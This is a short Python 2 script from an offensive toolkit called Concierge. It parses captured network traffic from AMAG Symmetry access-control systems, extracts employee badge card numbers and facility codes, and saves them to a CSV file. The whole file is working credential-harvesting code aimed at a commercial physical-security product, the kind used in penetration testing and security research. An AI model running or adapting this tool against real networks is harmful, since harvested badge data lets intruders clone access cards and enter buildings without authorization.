#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
# Parses supplied pcap to identify card numbers and facility codes.
# This specifically targets AMAG Symmetry SMS and associated hardware.
#
# Basic Usage:
# ./amag_pcap2cards.py -f <pcap file>.pcap
#

import re
import argparse
import pyshark
import sys
from os import path

def amag_parse(infile):
    print "[*] Loading pcap: "+infile+" ..."
    pcap = pyshark.FileCapture(infile, display_filter='tcp.port == 3001 && (frame contains "8Mt")')
    pcap.load_packets()
    num = len(pcap)
    print "[*] Parsing pcap for AMAG Symmetry badge numbers..."
    for packet in range(0 , num):
        pdata = str(pcap[packet].data.get_field_value('data'))
        full = pdata[-28:-12]
        raw_cn = re.findall('..',full[:10])
        raw_fc = re.findall('..',full[-6:])
        cn = int(str(int(str(int(str("0x"+raw_cn[0]), 16)-0x10).zfill(2))).zfill(2)+str(int(str(int(str("0x"+raw_cn[1]), 16)-0x10).zfill(2))).zfill(2)+str(int(str(int(str("0x"+raw_cn[2]), 16)-0x10).zfill(2))).zfill(2)+str(int(str(int(str("0x"+raw_cn[3]), 16)-0x10).zfill(2))).zfill(2)+str(int(str(int(str("0x"+raw_cn[4]), 16)-0x10).zfill(2))).zfill(2))
        fc = int(str(int(str(int(str("0x"+raw_fc[0]), 16)-0x10).zfill(2))).zfill(2)+str(int(str(int(str("0x"+raw_fc[1]), 16)-0x10).zfill(2))).zfill(2)+str(int(str(int(str("0x"+raw_fc[2]), 16)-0x10).zfill(2))).zfill(2))
        if cn > 0:
            with open("amag-badges.csv","a+")as f:
                f.write(str(cn)+","+str(fc)+","+infile+"\n")
            print "[+] CN: "+str(cn)+" FC:"+str(fc)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='./symmetry-pcap2cards.py -f <pcap file>')
    parser.add_argument('-f', '--infile', required=True,  help='Packet export txt')
    args = parser.parse_args()
    infile = args.infile
    print "#############################################"
    print "#             Concierge Toolkit             #"
    print "#                                           #"
    print "#      AMAG Symmetry SMS PCAP to Cards      #"
    print "#############################################"
    print ""
    if path.isfile("amag-badges.csv") == 0:
        with open("amag-badges.csv","a+")as f:
            f.write("card number,facility code,pcap file\n")
    try:   
        amag_parse(infile)
    except (KeyboardInterrupt, SystemExit)as e:
        print ""
        print "[!]Keyboard Interrupt: Stopping all processes"
        sys.exit()
